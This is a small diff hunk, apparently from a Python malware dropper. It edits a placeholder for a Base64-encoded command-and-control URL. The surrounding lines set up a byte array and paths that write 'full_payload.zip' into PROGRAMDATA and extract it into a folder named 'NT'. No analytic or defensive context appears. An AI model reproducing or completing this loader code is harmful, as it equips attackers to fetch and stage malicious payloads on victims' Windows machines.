@@ -23,7 +23,7 @@ zip_prefix = bytearray([
     168, 1, 131, 171
 ])
 
-url = "{replace_Base64_hosted_C2_URL}"
+url = "{replace_with_Base64_hosted_C2_URL}"
 output_zip_path = os.path.join(os.getenv("PROGRAMDATA"), "full_payload.zip")
 extract_dir = os.path.join(os.getenv("PROGRAMDATA"), "NT")
 
